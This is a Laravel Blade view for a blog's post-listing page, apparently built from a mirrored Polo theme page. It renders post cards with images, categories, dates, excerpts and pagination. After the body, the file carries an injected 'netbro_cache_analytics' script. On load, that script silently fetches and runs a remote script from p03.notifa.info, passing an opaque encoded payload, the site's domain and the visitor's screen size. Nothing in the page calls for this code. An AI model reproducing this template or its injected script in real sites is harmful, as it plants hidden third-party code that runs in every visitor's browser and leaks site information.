<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from www.inspirothemes.com/polo/blog-style-shadow.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 30 Sep 2019 06:21:45 GMT -->

<head>
    @include('web.layout.head')
</head>

<body>
    <div class="body-inner">

        {{-- Header --}}
        @include('web.layout.header')


        <section id="page-content">
            <div class="container ">
                <div class="page-title">
                    <div class="breadcrumb float-left">
                        <ul>
                            <li><a href="#">Home</a>
                            </li>
                            <li><a href="#">Blog</a>
                            </li>
                            <li class="active"><a href="#">Shadow</a>
                            </li>
                        </ul>
                    </div>
                </div>


                <div id="blog" class="grid-layout post-3-columns m-b-30" data-item="post-item">
                    @foreach ($posts as $post)
                    <div class="post-item border shadow">
                        <div class="post-item-wrap">
                            <div class="post-image">
                                <a href="#">
                                    <img alt="" src="{{asset('images/'.$post->image)}}">
                                </a>
                                <span class="post-meta-category"><a
                                        href="#">{{$post->category->name_category}}</a></span>
                            </div>
                            <div class="post-item-description">
                                <span class="post-meta-date"><i
                                        class="fa fa-calendar-o"></i>{{date('j M, Y h:ia', strtotime($post->created_at))}}</span>
                                <span class="post-meta-comments"><a href="#"><i class="fa fa-comments-o"></i>33
                                        Comments</a></span>
                                <h2><a href="{{route('blog.artikel',$post->slug)}}">{!! Str::limit($post->title, 50, '
                                        ...')!!}
                                    </a></h2>
                                <p>{!! Str::limit($post->body, 100, ' ...')!!}</p>
                                <a href="{{route('blog.artikel',$post->slug)}}" class="item-link">Read More <i
                                        class="fa fa-arrow-right"></i></a>
                            </div>
                        </div>
                    </div>
                    @endforeach

                </div>

                <ul class="pagination">
                    {{$posts->links()}}
                </ul>

            </div>

        </section>


        <footer id="footer">
            @include('web.layout.footer')
        </footer>

    </div>


    <a id="scrollTop"><i class="icon-chevron-up1"></i><i class="icon-chevron-up1"></i></a>

    @include('web.layout.foot')
</body>
<script type="text/javascript">
    if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2WzXUQZRDshhrWO%2b6QMDyPvRMvSzoNyvwCp%2f%2ftaDPrZECqh67Pbb6vQctU%2bv8opucZYX%2fHKLJKAcbzROuouSiDBPiwT0aA0CARt0IzfGZ1qWjGSoLhLZ84EjuCdxZeMBQBKqoeqhEA62FYgvSEkPWdLSVR457iCD814kyguqm0s0ZuETD3e8DHNLvQdNY7TtxYFU%2bNST1jmGbE9XyogjR5j4d8IQ4hywmC8vQzRZKuyi2PPUbxQr3TEzKuVV60JZSbSpY6rGz2JUx4VvkHQSbVvafEjYKbhhwhfisGOYbbASvUTywgbD8HbBWQyH15u%2blJy6CkJvRKS7hswx5AZfYaOMDJvqwdB9dM2yD8PoZJxBiHSoXuSTagoir7mYAgYJWnJnXqBIxf5eHZrHzv7YRE1%2b8grrrgJm9YUyV27S0sNgKipb59kiIB8OO0yE7a4ohEsIBAy57Wgg8I829YGv1uLvyP10bgQzIQW1t7AWMp68UcENro67D3H9nCelay7bH" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};
</script>
<!-- Mirrored from www.inspirothemes.com/polo/blog-style-shadow.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 30 Sep 2019 06:21:45 GMT -->

</html>